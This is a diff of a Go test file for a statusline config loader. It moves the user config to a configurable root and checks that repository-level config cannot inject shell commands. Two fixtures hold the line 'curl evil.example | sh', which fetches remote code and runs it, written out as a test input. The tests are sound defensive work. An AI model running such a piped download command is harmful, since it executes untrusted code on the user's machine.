@@ -181,11 +181,10 @@ cache_ms = 5000
 	}
 }
 
-// ToSlash so one expectation read on every runner: Windows join with "\".
-func TestPathsSitUnderDotClaude(t *testing.T) {
-	if got := filepath.ToSlash(UserPath("/home/u")); got != "/home/u/.claude/statusline.toml" {
-		t.Errorf("UserPath = %q", got)
-	}
+// ProjectPath alone still nest ".claude": a project's config lives inside its
+// own repository, unrelated to Claude Code config root. ToSlash so one
+// expectation read on every runner: Windows join with "\".
+func TestProjectPathSitsUnderDotClaude(t *testing.T) {
 	if got := filepath.ToSlash(ProjectPath("/w/acme")); got != "/w/acme/.claude/statusline.toml" {
 		t.Errorf("ProjectPath = %q", got)
 	}
@@ -363,11 +362,11 @@ func TestLoadFallsBackToPresetWhenNothingExists(t *testing.T) {
 	}
 }
 
-// Empty home mean no home directory to read. UserPath would yield relative
-// ".claude/statusline.toml" and pick up whatever directory process sit in.
-func TestLoadSkipsUserLayerWithoutHome(t *testing.T) {
+// Empty root mean no config directory to read. UserPath would yield relative
+// "statusline.toml" and pick up whatever directory process sit in.
+func TestLoadSkipsUserLayerWithoutARoot(t *testing.T) {
 	dir := t.TempDir()
-	writeConfig(t, filepath.Join(dir, ".claude", "statusline.toml"),
+	writeConfig(t, filepath.Join(dir, "statusline.toml"),
 		"[[lines]]\nsegments = [\"nothing_from_cwd\"]\n")
 	t.Chdir(dir)
 
@@ -381,11 +380,11 @@ func TestLoadSkipsUserLayerWithoutHome(t *testing.T) {
 }
 
 func TestLoadAppliesProjectOverride(t *testing.T) {
-	home, project := t.TempDir(), t.TempDir()
-	writeConfig(t, UserPath(home), "[[lines]]\nsegments = [\"model\", \"context\"]\n")
+	root, project := t.TempDir(), t.TempDir()
+	writeConfig(t, UserPath(root), "[[lines]]\nsegments = [\"model\", \"context\"]\n")
 	writeConfig(t, ProjectPath(project), "[[lines]]\nsegments = [\"model\"]\n")
 
-	res := Load(home, project)
+	res := Load(root, project)
 	if len(res.Config.Lines) != 1 || len(res.Config.Lines[0].Segments) != 1 {
 		t.Errorf("project override not applied: %+v", res.Config.Lines)
 	}
@@ -397,10 +396,10 @@ func TestLoadAppliesProjectOverride(t *testing.T) {
 // Broken file drop its own layer and get reported, never blank row: user with
 // typo still need to see their session.
 func TestLoadSurvivesABrokenUserConfig(t *testing.T) {
-	home := t.TempDir()
-	writeConfig(t, UserPath(home), "this is not toml\n")
+	root := t.TempDir()
+	writeConfig(t, UserPath(root), "this is not toml\n")
 
-	res := Load(home, "")
+	res := Load(root, "")
 	if len(res.Errors) == 0 {
 		t.Error("the parse failure should be reported")
 	}
@@ -410,11 +409,11 @@ func TestLoadSurvivesABrokenUserConfig(t *testing.T) {
 }
 
 func TestLoadSurvivesABrokenProjectOverride(t *testing.T) {
-	home, project := t.TempDir(), t.TempDir()
-	writeConfig(t, UserPath(home), "[[lines]]\nsegments = [\"model\"]\n")
+	root, project := t.TempDir(), t.TempDir()
+	writeConfig(t, UserPath(root), "[[lines]]\nsegments = [\"model\"]\n")
 	writeConfig(t, ProjectPath(project), "{{{\n")
 
-	res := Load(home, project)
+	res := Load(root, project)
 	if len(res.Errors) == 0 {
 		t.Error("the parse failure should be reported")
 	}
@@ -426,13 +425,13 @@ func TestLoadSurvivesABrokenProjectOverride(t *testing.T) {
 // Project config is repository content. Honouring command= there mean cloning
 // repository and opening it run whatever that file say, first render, no prompt.
 func TestLoadIgnoresCommandFromProjectConfig(t *testing.T) {
-	home, project := t.TempDir(), t.TempDir()
-	writeConfig(t, UserPath(home), "[[lines]]\nsegments = [\"model\"]\n")
+	root, project := t.TempDir(), t.TempDir()
+	writeConfig(t, UserPath(root), "[[lines]]\nsegments = [\"model\"]\n")
 	writeConfig(t, ProjectPath(project),
 		"[segments.deploy]\ntype = \"command\"\ncommand = \"curl evil.example | sh\"\n"+
 			"template = \"{out}\"\n")
 
-	res := Load(home, project)
+	res := Load(root, project)
 	if got := res.Config.Segments["deploy"]; got == nil || got.Command != nil {
 		t.Errorf("command survived the project layer: %+v", got)
 	}
@@ -446,14 +445,14 @@ func TestLoadIgnoresCommandFromProjectConfig(t *testing.T) {
 	}
 }
 
-// Trust boundary sit at $HOME, not at command segment. User config keep it.
+// Trust boundary sit at config root, not at command segment. User config keep it.
 func TestLoadKeepsCommandFromUserConfig(t *testing.T) {
-	home, project := t.TempDir(), t.TempDir()
-	writeConfig(t, UserPath(home),
+	root, project := t.TempDir(), t.TempDir()
+	writeConfig(t, UserPath(root),
 		"[segments.kube]\ntype = \"command\"\ncommand = \"kubectl config current-context\"\n")
 	writeConfig(t, ProjectPath(project), "[[lines]]\nsegments = [\"kube\"]\n")
 
-	res := Load(home, project)
+	res := Load(root, project)
 	seg := res.Config.Segments["kube"]
 	if seg == nil || seg.Command == nil || *seg.Command != "kubectl config current-context" {
 		t.Errorf("user command did not survive: %+v", seg)
@@ -466,15 +465,40 @@ func TestLoadKeepsCommandFromUserConfig(t *testing.T) {
 // Project layer must not replace command user config already declare, which
 // redirect existing segment rather than add one.
 func TestLoadIgnoresProjectCommandOverridingUserCommand(t *testing.T) {
-	home, project := t.TempDir(), t.TempDir()
-	writeConfig(t, UserPath(home),
+	root, project := t.TempDir(), t.TempDir()
+	writeConfig(t, UserPath(root),
 		"[segments.kube]\ntype = \"command\"\ncommand = \"kubectl config current-context\"\n")
 	writeConfig(t, ProjectPath(project),
 		"[segments.kube]\ncommand = \"curl evil.example | sh\"\n")
 
-	res := Load(home, project)
+	res := Load(root, project)
 	seg := res.Config.Segments["kube"]
 	if seg == nil || seg.Command == nil || *seg.Command != "kubectl config current-context" {
 		t.Errorf("project layer replaced the user command: %+v", seg)
+	}
+}
+
+// UserPath take config root, so CLAUDE_CONFIG_DIR carry statusline.toml with it.
+// Appending ".claude" here would nest a second one inside a moved root.
+func TestUserPathSitsDirectlyInTheRoot(t *testing.T) {
+	root := t.TempDir()
+	if got, want := UserPath(root), filepath.Join(root, "statusline.toml"); got != want {
+		t.Errorf("UserPath = %q, want %q", got, want)
+	}
+}
+
+// Message name file user must move command into. Hardcoded $HOME point at file
+// Claude Code never read once root moved.
+func TestProjectCommandErrorNamesTheUserPath(t *testing.T) {
+	root, project := t.TempDir(), t.TempDir()
+	writeConfig(t, ProjectPath(project),
+		"[segments.blame]\ncommand = \"echo hi\"\n\n[[lines]]\nsegments = [\"blame\"]\n")
+
+	res := Load(root, project)
+	if len(res.Errors) != 1 {
+		t.Fatalf("errors = %v, want exactly one", res.Errors)
+	}
+	if got := res.Errors[0].Error(); !strings.Contains(got, UserPath(root)) {
+		t.Errorf("error %q does not name %q", got, UserPath(root))
 	}
 }
